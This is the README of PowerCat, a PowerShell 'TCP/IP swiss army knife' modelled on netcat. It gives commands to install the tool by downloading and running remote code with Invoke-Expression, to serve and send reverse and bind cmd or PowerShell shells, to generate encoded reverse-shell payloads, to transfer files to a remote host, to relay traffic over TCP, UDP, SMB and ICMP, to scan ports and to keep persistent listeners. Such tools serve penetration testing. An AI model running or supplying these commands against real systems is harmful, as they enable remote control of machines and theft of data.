PowerCat
========
```powershell
Write-Warning 'PowerCat is under construction. Check back soon for updates.'
Write-Warning 'I will remove this warning when the code is functional.'
```
A PowerShell TCP/IP swiss army knife. 

Installation
------------
PowerCat is a PowerShell module.  First you need to import the module before you can use the PowerCat functions.  You can put one of the below commands into your PowerShell profile so PowerCat is automatically loaded when PowerShell starts.
###
```powershell
    # Import the functions from downloaded .psm1 File:
    Import-Module PowerCat.psm1
    # Load the functions individually from URL:
    Invoke-Expression (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/secabstraction/PowerCat/master/Invoke-PowerCat.ps1')
    Invoke-Expression (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/secabstraction/PowerCat/master/Invoke-DnsCat.ps1')
```
### Parameters:
```powershell    
    New-PowerCat
    
    -Listener       # Listen for a connection.                            [Switch]
    -Client         # IPv4 address of a listener to connect to.           [String]
    -Relay          # Format: "<Mode>:10.1.1.1:443"                       [String]
    
    -Mode           # Defaults to Tcp, can also specify Udp, Icmp         [String]
    -Port           # The port to connect to or listen on.                [Int]
    -Execute        # Execute a process.                                  [String]
    -PowerShell     # Execute Powershell.                                 [Switch]
    -Timeout        # Timeout option. Default: 60                         [Int]
    -Input          # Filepath (string), byte array, or string.           [Object]
    -OutputType     # Console Output Type: "Host", "Bytes", or "String"   [String]
    -OutputFile     # Output File Path.                                   [String]
    -Disconnect     # Disconnect after connecting.                        [Switch]
    -Repeat         # Restart after disconnecting.                        [Switch]
    -Payload        # Generate payload.                                   [Switch]
    -Encoded        # Base64 encode payload.                              [Switch]
```
Basic Connections
-----------------------------------
By default, PowerCat reads input from the console and writes input to the console using write-host. You can change the output type to 'Bytes', or 'String' with the -OutputType.
###
```powershell
    # Basic Listener:
    New-PowerCat -Listener -Port 443
        
    # Basic Client:
    New-PowerCat -Client 10.1.1.1 -Port 443
        
    # Basic Client, Output as Bytes:
    New-PowerCat -Client 10.1.1.1 -Port 443 -OutputType Bytes
```
File Transfer
-------------
PowerCat can be used to transfer files using the -Input and -OutputFile parameters.
###
```powershell
    # Send File:
    New-PowerCat -Client 10.1.1.1 -Port 443 -Input C:\pathto\inputfile
        
    # Recieve File:
    New-PowerCat -Listener -Port 443 -OutputFile C:\pathto\outputfile
```
Shells
------
PowerCat can be used to send and serve shells. Specify an executable to -Execute, or use -PowerShell to execute powershell.
###
```powershell
    # Serve a cmd Shell:
    New-PowerCat -Listener -Port 443 -Execute cmd
        
    # Send a cmd Shell:
    New-PowerCat -Client 10.1.1.1 -Port 443 -Execute cmd
        
    # Serve a shell which executes powershell commands:
    New-PowerCat -Listener -Port 443 -PowerShell
```
UDP, SMB, and ICMP
-----------
PowerCat supports more than sending data over TCP. 
###
```powershell
    # Send Data Over UDP:
    New-PowerCat -Listener -Port 8000 -Mode Udp
        
    # Send Data Over SMB:
    New-PowerCat -Listener -Mode Smb -PipeName PowerCat
    
    # Send Data Over ICMP:
    New-PowerCat -Listener -Mode Icmp
```
Relays
------
Relays in PowerCat are similar to netcat relays, but you don't have to create a file or start a second process. You can also relay data between connections of different protocols.
###
```powershell
    # TCP Listener to TCP Client Relay:
    New-PowerCat -Listener -Port 8000 -Relay tcp:10.1.1.16:443
        
    # TCP Listener to UDP Client Relay:
    New-PowerCat -Listener -Port 8000 -Relay udp:10.1.1.16:53
        
    # TCP Client to Client Relay
    New-PowerCat -Client 10.1.1.1 -Port 9000 -Relay tcp:10.1.1.16:443
        
    # TCP Listener to Listener Relay
    New-PowerCat -Listener -Port 8000 -Relay tcp:9000
```
Generate Payloads
-----------------
Payloads can be generated using -Payload or -Encoded parameters. 
###
```powershell
    # Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
    New-PowerCat -Client 10.1.1.15 -Port 443 -Execute cmd -Payload
        
    # Generate a bind tcp encoded command which listens on port 8000:
    New-PowerCat -Listener -Port 8000 -Execute cmd -Payload -Encoded
```
Misc Usage
----------
PowerCat can also be used to perform port-scans, and start persistent listeners.
###
```powershell
    # Basic TCP port scan:
    1..1024 | ForEach-Object { New-PowerCat -Client 10.1.1.10 -Port $_ -Timeout 1 -Verbose -Disconnect }
    
    # Basic UDP port scan:
    1..1024 | ForEach-Object { New-PowerCat -Mode Udp -Client 10.1.1.10 -Port $_ -Timeout 1 -Verbose }
        
    # Persistent listener:
    New-PowerCat -Listener -Port 443 -Input C:\pathto\inputfile -Repeat
```
